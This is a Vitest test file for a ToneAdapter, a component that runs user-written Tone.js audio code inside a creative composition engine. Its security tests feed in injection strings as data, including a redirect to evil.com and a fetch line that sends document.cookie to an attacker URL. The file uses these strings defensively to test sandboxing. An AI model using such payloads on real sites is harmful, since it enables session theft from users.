/**
 * Tests for ToneAdapter
 *
 * Following TDD: RED, GREEN, REFACTOR
 *
 * @vitest-environment jsdom
 */

import { describe, it, expect, beforeEach, vi, afterEach } from 'vitest';
import { ToneAdapter } from '../../../../src/composition/adapters/ToneAdapter.js';
import type { Layer, GlobalSettings } from '../../../../src/composition/types.js';
import type { RenderContext } from '../../../../src/composition/CompositionEngine.js';
import { StateManager } from '../../../../src/composition/CompositionEngine.js';

// Mock Tone.js types
interface MockToneSynth {
  frequency: { value: number };
  triggerAttackRelease: (note: string, duration: string) => void;
  toDestination: () => MockToneSynth;
  dispose?: () => void;
}

interface MockToneTransport {
  state: 'started' | 'stopped' | 'paused';
  bpm: { value: number };
  start: () => void;
  stop: () => void;
}

interface MockToneInstance {
  Synth: new () => MockToneSynth;
  Transport: MockToneTransport;
  start: () => Promise<void>;
  Destination: { volume: { value: number } };
  getContext: () => { currentTime: number };
}

// Create mock Tone.js
function createMockTone(): MockToneInstance {
  const mockSynth: MockToneSynth = {
    frequency: { value: 440 },
    triggerAttackRelease: vi.fn(),
    toDestination: vi.fn().mockReturnThis(),
    dispose: vi.fn(),
  };

  const mockTransport: MockToneTransport = {
    state: 'stopped',
    bpm: { value: 120 },
    start: vi.fn(),
    stop: vi.fn(),
  };

  return {
    Synth: vi.fn().mockReturnValue(mockSynth),
    Transport: mockTransport,
    start: vi.fn().mockResolvedValue(undefined),
    Destination: { volume: { value: -10 } },
    getContext: vi.fn().mockReturnValue({ currentTime: 0 }),
  };
}

describe('ToneAdapter', () => {
  let adapter: ToneAdapter;
  let mockLayer: Layer;
  let mockContainer: HTMLElement;
  let mockSettings: GlobalSettings;
  let MockTone: MockToneInstance;

  beforeEach(() => {
    // Create mock Tone
    MockTone = createMockTone();

    // Reset adapter
    adapter = new ToneAdapter();

    // Setup mock layer
    mockLayer = {
      id: 'test-tone-layer',
      type: 'tone',
      code: 'const synth = new Tone.Synth().toDestination();',
      config: {
        zIndex: 1,
        blendMode: 'normal',
        opacity: 1.0,
        position: { x: 0, y: 0 },
        scale: 1.0,
      },
      metadata: {
        prompt: 'Test tone layer',
        generator: 'ToneGenerator',
        model: 'test-model',
        generatedAt: new Date().toISOString(),
      },
      enabled: true,
      locked: false,
    };

    // Setup mock container
    mockContainer = document.createElement('div');
    mockContainer.id = 'test-container';

    // Setup mock settings
    mockSettings = {
      width: 800,
      height: 600,
      frameRate: 60,
      backgroundColor: '#000000',
      audio: { volume: 0.8 },
    };

    // Setup mock window.Tone
    (window as unknown as { Tone: MockToneInstance }).Tone = MockTone;

    // Reset mocks
    vi.clearAllMocks();
  });

  afterEach(() => {
    vi.clearAllMocks();
    // Clean up window.Tone
    delete (window as unknown as { Tone?: MockToneInstance }).Tone;
  });

  describe('initialize()', () => {
    it('should load Tone module from window global', () => {
      adapter.initialize();

      // After initialization, render should work without throwing
      const container = document.createElement('div');
      expect(() => adapter.render(mockLayer, container)).not.toThrow('Tone.js not loaded');
    });

    it('should not reload if already initialized', () => {
      adapter.initialize();
      const firstInit = adapter;

      adapter.initialize();

      // Should be the same instance
      expect(adapter).toBe(firstInit);
    });
  });

  describe('render()', () => {
    it('should throw error if Tone is not loaded', () => {
      // Create fresh adapter without initialization and remove window.Tone
      delete (window as unknown as { Tone?: MockToneInstance }).Tone;
      const freshAdapter = new ToneAdapter();

      expect(() => {
        freshAdapter.render(mockLayer, mockContainer);
      }).toThrow('Tone.js not loaded. Call async initialize() first.');

      // Restore window.Tone
      (window as unknown as { Tone: MockToneInstance }).Tone = MockTone;
    });

    it('should create controls in the container', () => {
      adapter.initialize();
      adapter.render(mockLayer, mockContainer);

      const startBtn = mockContainer.querySelector(`button[id^="tone-start-"]`);
      const stopBtn = mockContainer.querySelector(`button[id^="tone-stop-"]`);

      expect(startBtn).toBeTruthy();
      expect(stopBtn).toBeTruthy();
    });

    it('should store instance for later retrieval', () => {
      adapter.initialize();
      const instance = adapter.render(mockLayer, mockContainer);

      // Instance should be returned
      expect(instance).toBeTruthy();
      expect(instance.synths).toBeDefined();
      expect(instance.transport).toBeDefined();
    });

    it('should handle errors in user code gracefully', () => {
      adapter.initialize();

      const layerWithError = { ...mockLayer, code: 'invalid syntax {{' };

      // Should not throw, just log error
      expect(() => adapter.render(layerWithError, mockContainer)).not.toThrow();
    });
  });

  describe('ToneAdapter Security', () => {
    it('should not execute arbitrary code via user input', () => {
      adapter.initialize();

      // Test various malicious code patterns
      const maliciousCodes = [
        `'; alert("hacked"); //`,
        `"; document.location='https://evil.com'; //`,
        `'; fetch('https://evil.com/steal?cookie=' + document.cookie); //`,
        `"; window.location.href = 'javascript:alert(1)'; //`,
      ];

      for (const maliciousCode of maliciousCodes) {
        const maliciousLayer = { ...mockLayer, code: maliciousCode };

        // Should not throw but should handle gracefully
        expect(() => adapter.render(maliciousLayer, mockContainer)).not.toThrow();
      }
    });

    it('should sanitize code before execution', () => {
      adapter.initialize();

      // Code with potential dangerous patterns should be handled
      const codeWithDangerousPatterns = `
        const synth = new Tone.Synth().toDestination();
        // Some comment with <script>alert(1)</script>
      `;

      const layerWithScriptTag = { ...mockLayer, code: codeWithDangerousPatterns };

      // Should not throw
      expect(() => adapter.render(layerWithScriptTag, mockContainer)).not.toThrow();
    });

    it('should not allow access to global window properties through code', () => {
      adapter.initialize();

      // Attempt to access window properties
      const codeAccessingWindow = `
        const synth = new Tone.Synth().toDestination();
        // Try to access window
        window.__testAccess = true;
      `;

      const layerAccessingWindow = { ...mockLayer, code: codeAccessingWindow };

      // Should not throw during render
      expect(() => adapter.render(layerAccessingWindow, mockContainer)).not.toThrow();

      // The code should not have modified window in an unsafe way
      // (The sandbox should prevent this)
    });
  });

  describe('getExports()', () => {
    it('should return empty array if layer not rendered', () => {
      const exports = adapter.getExports(mockLayer);
      expect(exports).toEqual([]);
    });

    it('should return isPlaying export', () => {
      adapter.initialize();
      adapter.render(mockLayer, mockContainer);

      const exports = adapter.getExports(mockLayer);
      const isPlayingExport = exports.find(e => e.name === 'isPlaying');

      expect(isPlayingExport).toBeTruthy();
      expect(isPlayingExport?.type).toBe('boolean');
      expect(isPlayingExport?.getter()).toBe(false);
    });

    it('should return bpm export', () => {
      adapter.initialize();
      adapter.render(mockLayer, mockContainer);

      const exports = adapter.getExports(mockLayer);
      const bpmExport = exports.find(e => e.name === 'bpm');

      expect(bpmExport).toBeTruthy();
      expect(bpmExport?.type).toBe('number');
      expect(bpmExport?.getter()).toBe(120);
    });

    it('should return currentTime export', () => {
      adapter.initialize();
      adapter.render(mockLayer, mockContainer);

      const exports = adapter.getExports(mockLayer);
      const timeExport = exports.find(e => e.name === 'currentTime');

      expect(timeExport).toBeTruthy();
      expect(timeExport?.type).toBe('number');
      expect(timeExport?.getter()).toBe(0);
    });

    it('should return masterVolume export', () => {
      adapter.initialize();
      adapter.render(mockLayer, mockContainer);

      const exports = adapter.getExports(mockLayer);
      const volumeExport = exports.find(e => e.name === 'masterVolume');

      expect(volumeExport).toBeTruthy();
      expect(volumeExport?.type).toBe('number');
      expect(volumeExport?.getter()).toBe(-10);
    });

    it('should return activeSynths export', () => {
      adapter.initialize();
      adapter.render(mockLayer, mockContainer);

      const exports = adapter.getExports(mockLayer);
      const synthsExport = exports.find(e => e.name === 'activeSynths');

      expect(synthsExport).toBeTruthy();
      expect(synthsExport?.type).toBe('number');
      expect(synthsExport?.getter()).toBe(0);
    });

    it('should return elapsedTime export', () => {
      adapter.initialize();
      adapter.render(mockLayer, mockContainer);

      const exports = adapter.getExports(mockLayer);
      const elapsedExport = exports.find(e => e.name === 'elapsedTime');

      expect(elapsedExport).toBeTruthy();
      expect(elapsedExport?.type).toBe('number');
      expect(elapsedExport?.getter()).toBeGreaterThanOrEqual(0);
    });

    it('should have descriptions for all exports', () => {
      adapter.initialize();
      adapter.render(mockLayer, mockContainer);

      const exports = adapter.getExports(mockLayer);

      for (const exp of exports) {
        expect(exp.description).toBeTruthy();
        expect(exp.description?.length).toBeGreaterThan(0);
      }
    });
  });

  describe('getImports()', () => {
    it('should return imports array', () => {
      const imports = adapter.getImports();
      expect(Array.isArray(imports)).toBe(true);
    });

    it('should import mouseX from p5 layers', () => {
      const imports = adapter.getImports();
      const p5Import = imports.find(i => i.from === 'p5' && i.name === 'mouseX');

      expect(p5Import).toBeTruthy();
      expect(p5Import?.as).toBe('modulationX');
      expect(p5Import?.required).toBe(false);
    });

    it('should import mouseY from p5 layers', () => {
      const imports = adapter.getImports();
      const p5Import = imports.find(i => i.from === 'p5' && i.name === 'mouseY');

      expect(p5Import).toBeTruthy();
      expect(p5Import?.as).toBe('modulationY');
      expect(p5Import?.required).toBe(false);
    });

    it('should import frameCount from p5 layers', () => {
      const imports = adapter.getImports();
      const p5Import = imports.find(i => i.from === 'p5' && i.name === 'frameCount');

      expect(p5Import).toBeTruthy();
      expect(p5Import?.as).toBe('syncFrame');
      expect(p5Import?.required).toBe(false);
    });
  });

  describe('validate()', () => {
    it('should validate valid Tone code with Tone.Synth', () => {
      const layer = { ...mockLayer, code: 'const synth = new Tone.Synth().toDestination();' };
      const result = adapter.validate(layer);

      expect(result.valid).toBe(true);
      expect(result.errors).toBeUndefined();
    });

    it('should validate valid Tone code with Tone.Transport', () => {
      const layer = { ...mockLayer, code: 'Tone.Transport.bpm.value = 120;' };
      const result = adapter.validate(layer);

      expect(result.valid).toBe(true);
      expect(result.errors).toBeUndefined();
    });

    it('should reject code without Tone reference', () => {
      const layer = { ...mockLayer, code: 'const x = 1 + 1;' };
      const result = adapter.validate(layer);

      expect(result.valid).toBe(false);
      expect(result.errors).toContain('Code does not reference Tone.js (Tone. not found)');
    });

    it('should reject empty code', () => {
      const layer = { ...mockLayer, code: '' };
      const result = adapter.validate(layer);

      expect(result.valid).toBe(false);
    });
  });

  describe('generateScript()', () => {
    it('should generate HTML script', () => {
      const script = adapter.generateScript(mockLayer, mockSettings);

      expect(script).toContain('<script');
      expect(script).toContain('</script>');
    });

    it('should include Tone.js CDN URL', () => {
      const script = adapter.generateScript(mockLayer, mockSettings);

      expect(script).toContain('https://cdnjs.cloudflare.com/ajax/libs/tone/14.8.49/Tone.js');
    });

    it('should wrap code in IIFE', () => {
      const script = adapter.generateScript(mockLayer, mockSettings);

      expect(script).toContain('(function() {');
      expect(script).toContain('})();');
    });

    it('should include the layer code', () => {
      const script = adapter.generateScript(mockLayer, mockSettings);

      expect(script).toContain(mockLayer.code);
    });

    it('should set volume from settings', () => {
      const script = adapter.generateScript(mockLayer, mockSettings);

      expect(script).toContain('Tone.Destination.volume.value');
    });
  });

  describe('destroy()', () => {
    it('should stop the transport', () => {
      adapter.initialize();
      adapter.render(mockLayer, mockContainer);

      adapter.destroy(mockLayer);

      expect(MockTone.Transport.stop).toHaveBeenCalled();
    });

    it('should dispose synths if they have dispose method', () => {
      adapter.initialize();
      adapter.render(mockLayer, mockContainer);

      // Manually add a synth with dispose method
      const mockSynthWithDispose = {
        frequency: { value: 440 },
        triggerAttackRelease: vi.fn(),
        toDestination: vi.fn().mockReturnThis(),
        dispose: vi.fn(),
      };

      // Get the instance and add the mock synth
      const instance = adapter.render(mockLayer, mockContainer);
      instance.synths.push(mockSynthWithDispose as unknown as MockToneSynth);

      adapter.destroy(mockLayer);

      expect(mockSynthWithDispose.dispose).toHaveBeenCalled();
    });

    it('should handle destroying non-existent layer gracefully', () => {
      // Should not throw when destroying layer that was never rendered
      expect(() => adapter.destroy(mockLayer)).not.toThrow();
    });

    it('should remove instance from internal tracking', () => {
      adapter.initialize();
      adapter.render(mockLayer, mockContainer);

      // First verify instance is tracked
      expect(adapter.getExports(mockLayer).length).toBeGreaterThan(0);

      adapter.destroy(mockLayer);

      // After destroy, exports should be empty
      expect(adapter.getExports(mockLayer)).toEqual([]);
    });
  });
});

// Singleton export test
describe('toneAdapter singleton', () => {
  it('should be exported as singleton', async () => {
    const { toneAdapter } = await import('../../../../src/composition/adapters/ToneAdapter.js');
    expect(toneAdapter).toBeInstanceOf(ToneAdapter);
  });
});
